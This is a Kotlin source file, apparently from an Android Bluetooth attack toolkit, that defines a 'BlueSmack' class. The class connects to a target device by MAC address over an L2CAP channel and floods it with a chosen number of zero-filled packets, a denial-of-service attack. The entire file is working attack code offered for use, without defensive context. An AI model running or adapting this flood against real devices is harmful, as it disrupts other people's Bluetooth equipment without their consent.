package com.hereliesaz.blusnu.attack

import android.Manifest
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothDevice
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import java.io.IOException

class BlueSmack(
    private val context: Context,
    private val bluetoothAdapter: BluetoothAdapter?
) {
    fun attack(macAddress: String, packetSize: Int, packetCount: Int) {
        if (bluetoothAdapter == null) {
            // Handle Bluetooth not supported
            return
        }

        val device: BluetoothDevice? = bluetoothAdapter.getRemoteDevice(macAddress)
        if (device == null) {
            // Handle device not found
            return
        }

        if (ActivityCompat.checkSelfPermission(
                context,
                Manifest.permission.BLUETOOTH_CONNECT
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            // Handle missing permission
            return
        }

        try {
            val socket = device.createL2capChannel(1) // PSM for SDP
            socket.connect()
            val outputStream = socket.outputStream
            val payload = ByteArray(packetSize)
            for (i in 0 until packetCount) {
                outputStream.write(payload)
            }
            socket.close()
        } catch (e: IOException) {
            e.printStackTrace()
        }
    }
}